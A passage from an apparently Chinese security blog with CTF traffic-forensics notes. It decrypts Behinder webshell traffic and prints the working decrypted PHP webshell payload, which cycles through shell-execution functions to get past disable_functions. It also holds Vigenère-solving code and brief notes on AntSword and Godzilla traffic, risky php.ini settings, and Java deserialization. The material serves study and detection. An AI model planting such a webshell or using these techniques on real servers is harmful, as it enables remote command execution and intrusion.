解决tcp请求包截取不完整导致aes解密后没有</span></span><br><span class="line"><span class="comment">// print(&quot;intotheexplode:&quot;.$parm);</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$parm</span> === <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$parm</span>=<span class="string">&#x27;Y29udGVudCBpcyBlbXB0eQ==&#x27;</span>;       <span class="comment"># 解决 http截取的tcp包不完整的情况</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z0-9\+\=\/]&#123;24,&#125;/i&#x27;</span>,<span class="variable">$parm</span>,<span class="variable">$last_result</span>);</span><br><span class="line"><span class="comment">// echo &quot;匹配到的内容为&quot;.$result[0];</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$last_result</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$last_result</span>[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$parm</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php decropt.php -a 后面接要解密的字符串</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php decropt.php -f 解密的字符串的文件</span><br></pre></td></tr></table></figure>

<blockquote>
<p>此处的密文字符串文件只允许存在密文，不允许有http请求体。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php decropt.php -k 秘钥 -a 解密字符串</span><br></pre></td></tr></table></figure>

<blockquote>
<p>默认的key值为冰蝎默认密码。</p>
</blockquote>
<p>tcp 流5</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php decropt.php -k 2295d22e2d70888f -a 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</span><br></pre></td></tr></table></figure>



<p>解密后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@error_reporting(0);</span><br><span class="line"></span><br><span class="line">function getSafeStr($str)&#123;</span><br><span class="line">    $s1 = iconv(&#x27;utf-8&#x27;,&#x27;gbk//IGNORE&#x27;,$str);</span><br><span class="line">    $s0 = iconv(&#x27;gbk&#x27;,&#x27;utf-8//IGNORE&#x27;,$s1);</span><br><span class="line">    if($s0 == $str)&#123;</span><br><span class="line">        return $s0;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return iconv(&#x27;gbk&#x27;,&#x27;utf-8//IGNORE&#x27;,$str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function main($cmd)</span><br><span class="line">&#123;</span><br><span class="line">    @set_time_limit(0);</span><br><span class="line">    @ignore_user_abort(1);</span><br><span class="line">    @ini_set(&#x27;max_execution_time&#x27;, 0);</span><br><span class="line">    $result = array();</span><br><span class="line">    $PadtJn = @ini_get(&#x27;disable_functions&#x27;);</span><br><span class="line">    if (! empty($PadtJn)) &#123;</span><br><span class="line">        $PadtJn = preg_replace(&#x27;/[, ]+/&#x27;, &#x27;,&#x27;, $PadtJn);</span><br><span class="line">        $PadtJn = explode(&#x27;,&#x27;, $PadtJn);</span><br><span class="line">        $PadtJn = array_map(&#x27;trim&#x27;, $PadtJn);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $PadtJn = array();</span><br><span class="line">    &#125;</span><br><span class="line">    $c = $cmd;</span><br><span class="line">    if (FALSE !== strpos(strtolower(PHP_OS), &#x27;win&#x27;)) &#123;</span><br><span class="line">        $c = $c . &quot; 2&gt;&amp;1\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $JueQDBH = &#x27;is_callable&#x27;;</span><br><span class="line">    $Bvce = &#x27;in_array&#x27;;</span><br><span class="line">    if ($JueQDBH(&#x27;system&#x27;) and ! $Bvce(&#x27;system&#x27;, $PadtJn)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        system($c);</span><br><span class="line">        $kWJW = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125; else if ($JueQDBH(&#x27;proc_open&#x27;) and ! $Bvce(&#x27;proc_open&#x27;, $PadtJn)) &#123;</span><br><span class="line">        $handle = proc_open($c, array(</span><br><span class="line">            array(</span><br><span class="line">                &#x27;pipe&#x27;,</span><br><span class="line">                &#x27;r&#x27;</span><br><span class="line">            ),</span><br><span class="line">            array(</span><br><span class="line">                &#x27;pipe&#x27;,</span><br><span class="line">                &#x27;w&#x27;</span><br><span class="line">            ),</span><br><span class="line">            array(</span><br><span class="line">                &#x27;pipe&#x27;,</span><br><span class="line">                &#x27;w&#x27;</span><br><span class="line">            )</span><br><span class="line">        ), $pipes);</span><br><span class="line">        $kWJW = NULL;</span><br><span class="line">        while (! feof($pipes[1])) &#123;</span><br><span class="line">            $kWJW .= fread($pipes[1], 1024);</span><br><span class="line">        &#125;</span><br><span class="line">        @proc_close($handle);</span><br><span class="line">    &#125; else if ($JueQDBH(&#x27;passthru&#x27;) and ! $Bvce(&#x27;passthru&#x27;, $PadtJn)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        passthru($c);</span><br><span class="line">        $kWJW = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125; else if ($JueQDBH(&#x27;shell_exec&#x27;) and ! $Bvce(&#x27;shell_exec&#x27;, $PadtJn)) &#123;</span><br><span class="line">        $kWJW = shell_exec($c);</span><br><span class="line">    &#125; else if ($JueQDBH(&#x27;exec&#x27;) and ! $Bvce(&#x27;exec&#x27;, $PadtJn)) &#123;</span><br><span class="line">        $kWJW = array();</span><br><span class="line">        exec($c, $kWJW);</span><br><span class="line">        $kWJW = join(chr(10), $kWJW) . chr(10);</span><br><span class="line">    &#125; else if ($JueQDBH(&#x27;exec&#x27;) and ! $Bvce(&#x27;popen&#x27;, $PadtJn)) &#123;</span><br><span class="line">        $fp = popen($c, &#x27;r&#x27;);</span><br><span class="line">        $kWJW = NULL;</span><br><span class="line">        if (is_resource($fp)) &#123;</span><br><span class="line">            while (! feof($fp)) &#123;</span><br><span class="line">                $kWJW .= fread($fp, 1024);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        @pclose($fp);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $kWJW = 0;</span><br><span class="line">        $result[&quot;status&quot;] = base64_encode(&quot;fail&quot;);</span><br><span class="line">        $result[&quot;msg&quot;] = base64_encode(&quot;none of proc_open/passthru/shell_exec/exec/exec is available&quot;);</span><br><span class="line">        $key = $_SESSION[&#x27;k&#x27;];</span><br><span class="line">        echo encrypt(json_encode($result), $key);</span><br><span class="line">        return;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    $result[&quot;status&quot;] = base64_encode(&quot;success&quot;);</span><br><span class="line">    $result[&quot;msg&quot;] = base64_encode(getSafeStr($kWJW));</span><br><span class="line">    echo encrypt(json_encode($result),  $_SESSION[&#x27;k&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function encrypt($data,$key)</span><br><span class="line">&#123;</span><br><span class="line">        if(!extension_loaded(&#x27;openssl&#x27;))</span><br><span class="line">        &#123;</span><br><span class="line">                for($i=0;$i&lt;strlen($data);$i++) &#123;</span><br><span class="line">                         $data[$i] = $data[$i]^$key[$i+1&amp;15];</span><br><span class="line">                        &#125;</span><br><span class="line">                        return $data;</span><br><span class="line">        &#125;</span><br><span class="line">    else</span><br><span class="line">        &#123;</span><br><span class="line">                return openssl_encrypt($data, &quot;AES128&quot;, $key);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;$cmd=&quot;cat GronKey.txt&quot;;</span><br><span class="line">main($cmd);</span><br></pre></td></tr></table></figure>

<p>对应返回包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php decropt.php -k 2295d22e2d70888f -a w5lcFkJ5g/LtCqI0NgGN0nr2fGo9r1/AzKUMpzC878J4hU17Fu2Q89EMiYBl3hWbGAewU7bpnuWx4oBUmohKkg==</span><br></pre></td></tr></table></figure>

<p>解密结果</p>
<p>$cmd&#x3D;”cat GronKey.txt”;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;status&quot;:&quot;success&quot;,&quot;msg&quot;:&quot;1,50,61,8,9,20,63,41&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>tcp流三</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#125;$cmd=&quot;cat flag.txt&quot;;</span><br><span class="line">main($cmd);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;status&quot;:&quot;success&quot;,&quot;msg&quot;:&quot;TGLBOMSJNSRAJAZDEZXGHSJNZWHG&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>tcp流2</p>
<p>Vigenere解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s = [1,50,61,8,9,20,63,41]</span><br><span class="line">import string</span><br><span class="line">dic = string.ascii_lowercase</span><br><span class="line">key = &#x27;&#x27;</span><br><span class="line">for k in s:</span><br><span class="line">    key += dic[k%26]</span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure>

<p>解的维吉尼亚的key </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def decrypt_string(ciphertext, offsets):</span><br><span class="line">    decrypted_string = &quot;&quot;</span><br><span class="line">    offset_index = 0</span><br><span class="line"></span><br><span class="line">    for char in ciphertext:</span><br><span class="line">        offset = offsets[offset_index] % 26</span><br><span class="line">        decrypted_char_code = (ord(char) - ord(&#x27;A&#x27;) - offset) % 26 + ord(&#x27;A&#x27;)</span><br><span class="line">        decrypted_char = chr(decrypted_char_code)</span><br><span class="line">        decrypted_string += decrypted_char</span><br><span class="line"></span><br><span class="line">        offset_index = (offset_index + 1) % len(offsets)</span><br><span class="line"></span><br><span class="line">    return decrypted_string</span><br><span class="line"></span><br><span class="line">ciphertext = &quot;TGLBOMSJNSRAJAZDEZXGHSJNZWHG&quot;</span><br><span class="line">offsets = [1, 50, 61, 8, 9, 20, 63]</span><br><span class="line">decrypted_string = decrypt_string(ciphertext, offsets)</span><br><span class="line">print(decrypted_string)</span><br></pre></td></tr></table></figure>



<h1 id="蚁剑流量"><a href="#蚁剑流量" class="headerlink" title="蚁剑流量"></a>蚁剑流量</h1><p>流量特征</p>
<p><a href="https://blog.csdn.net/UserNick157/article/details/124405353">中国蚁剑流量分析-CSDN博客</a></p>
<h1 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h1><p>流量特征</p>
<p>哥斯拉的作者应该还没有意识到，在请求包的Cookie中有一个非常致命的特征，最后的分号</p>
<p>通过Burp抓包可知，第1个请求会发送大量数据，该请求不含有任何Cookie信息，服务器响应报文不含任何数据，但是会设置PHPSESSID，后续请求都会自动带上该Cookie</p>
<p><a href="https://blog.csdn.net/sinat_31884905/article/details/132548617">【流量分析】Godzilla分析_哥斯拉流量特征-CSDN博客</a></p>
]]></content>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>php.ini</title>
    <url>/2024/04/05/php-ini/</url>
    <content><![CDATA[<p> phpinfo</p>
<span id="more"></span>



<h1 id="配置函数"><a href="#配置函数" class="headerlink" title="配置函数"></a>配置函数</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="disable-function"><a href="#disable-function" class="headerlink" title="disable_function"></a>disable_function</h1><p>php 4.0.1 起可以用disable_function</p>
<p>蚁剑插件绕过</p>
<h1 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h1><p>将 PHP 所能打开的文件限制在指定的目录树，包括文件本身。本指令不受安全模式打开或者关闭的影<br>响。一般只需要设置Web文件目录即可，如果需要加载外部脚本，也需要把脚本所在目录路径加入到<br>open_basedir指令中，多个目录以分号()分割(windows)和冒号0分割(linux)。使用 open basedir 需<br>要注意的一点是，指定的限制实际上是前缀，而不是目录名。例如，如果配置 open basedir<br>&#x3D;&#x2F;www&#x2F;a，那么目录&#x2F;www&#x2F;a 和&#x2F;www&#x2F;ab 都是可以访问的。所以如果要将访问仅限制在指定的目录<br>内，请用斜线结束路径名，设置成: open basedir &#x3D; &#x2F;www&#x2F;a&#x2F;。<br>当 open basedir 配置目录后，执行脚本访问其他文件都需要验证文件路径，因此在执行效率上面也<br>会有一定的影响。该指令的配置范围在 PHP 版本小于 5.2.3 时是PHP INI SYSTEM，在 PHP 版本大于<br>等于 5.2.3 是 PHP INI ALL。</p>
<h1 id="环境变量getshell"><a href="#环境变量getshell" class="headerlink" title="环境变量getshell"></a>环境变量getshell</h1><h1 id="magic-quotes-gpc"><a href="#magic-quotes-gpc" class="headerlink" title="magic_quotes_gpc"></a>magic_quotes_gpc</h1><p>magic_quotes gpc在安全方面做了很大的贡献，只要它被开启，在不存编码或者其他特殊绕过的情况<br>下，可以使得很多漏洞无法被利用。当该选项设置为On<br>时，会自动在GET，POST，COOKIE变量中的单引号()，双引号“，反斜杠0以及空字符(NULL)的前面<br>加上反斜杠0，但是在PHP5中magic quotes gpc并不会过滤$ SERVER变量，导致很多类似ip,<br>referer一类的漏洞能够利用。在PHP5.3之后的不推荐使用magic gquotes gpc，PHP5.4之后干脆被取<br>消，所以你下载PHP 5.4之后的版本并打开配置文件会发现找不到这个配置选项。在PHP版本小于4.2.3<br>时，配置范围是PHP INI ALL; 在PHP版本大于4.2.3时，是PHP INI PER</p>
<h1 id="allow-url-include"><a href="#allow-url-include" class="headerlink" title="allow_url_include"></a>allow_url_include</h1><p>版本:PHP 4.30 起可用</p>
<p>在配置为on的情况下，它可以直接包含远程文件，当存在<br>该选项对PHP安全的影响不可小觑。<br>include($var)且$var可控的情况下，可以直接控制svar变量来执行PHP代码。<br>allow url include在PHP5.2.0后默认设置为off，配置范围是PHP INI ALL.<br>配置allow url include为On，可以直接包涵远程文件，否则只能包涵本地文件</p>
<h1 id="allow-url-fopen"><a href="#allow-url-fopen" class="headerlink" title="allow_url_fopen"></a>allow_url_fopen</h1><p>版本:PHP 4.0.4 起可用<br>该配置为On的情况下，它可以读取远程文件，当存在fopen($var)且$var变量可控的情况下，可以直接<br>控制变量来SSRF。<br>allow url fopen默认设置为On，配置范围是PHP_INI SYSTEM。在PHP &lt;&#x3D; 4.3.4时是PHP_INI ALL。</p>
<h1 id="short-open-tag"><a href="#short-open-tag" class="headerlink" title="short_open_tag"></a>short_open_tag</h1><p>短标签是否开启</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;? echo 1; ?&gt; 短标签写法，5.4 起 &lt;?= &#x27;hello&#x27;; === &lt;? echo &#x27;hello&#x27;;</span><br><span class="line"></span><br><span class="line">&lt;?= phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<p>第 2 种，需要 php.ini 配置文件中的指令 short_open_tag 打开后才可用，或者在 PHP 编译时加入了 –enable-short-tags 选项。自 PHP5.4 起，短格式的 echo 标记 &lt;?&#x3D; 总会被识别并且合法，而不管 short_open_tag 的设置是什么</p>
<p>一些见到的php.ini 函数</p>
]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>java反序列化</title>
    <url>/2024/10/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>java 基础</p>
<span id="more"></span>

<p>java 命令执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">serialization</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;notepad.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="反序列化基础"><a href="#反序列化基础" class="headerlink" title="反序列化基础"></a>反序列化基础</h2><p>JDK类库中序列化API</p>
<p>问什么会产生安全问题</p>
<p><strong>只要服务端反序列化数据，客户端传递类的readObject中代码会自动执行，给予攻击这在服务器上运行代码的能力。</strong></p>
<p>可能的形式</p>
<ol>
<li>入口类的readObject直接调用危险方法</li>
<li>入口类参数中包含可控类，该类有危险方法，readObject时调用。</li>
<li>入口类参数中包含可控类，该类又调用其他，有危险方法的类，readObject时调用</li>
</ol>
<p>比如类型定义为Object 调用equals&#x2F;hashcode&#x2F;toString</p>
<p>重点 相同类型 ，同名函数</p>
<p>4.构造函数&#x2F;静态代码块等类加载时隐式执行.</p>
<p>共同条件，继承Serializable</p>
<p>入口类source （重写readObject 调用常见的函数，参数类型宽泛，最好jdk自带）</p>
<p>调用链 gadget chain</p>
<p>执行类 sink (rce ssrf写文件等等)</p>
<p><strong>java.io.ObjectOutputStream：表示对象输出流</strong></p>
<p>它的writeObject(Object obj)方法可以对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。</p>
<p><strong>java.io.ObjectInputStream：表示对象输入流</strong></p>
<p>它的readObject()方法源输入流中读取字节序列，再把它们反序列化成为一个对象，并将其返回</p>
<p> 5.transient 标识的对象成员变量不参与序列化</p>
<p>Person.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Externalizable;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>  <span class="comment">//implements Serializable 序列化的接口</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span>  <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span> <span class="params">(String name,<span class="type">int</span> age)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.name =name;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span>+</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span>+name+<span class="string">&#x27;\&#x27;&#x27;</span>+</span><br><span class="line">                <span class="string">&quot;,age=&quot;</span>+age+</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">void</span> <span class="title function_">readObject</span><span 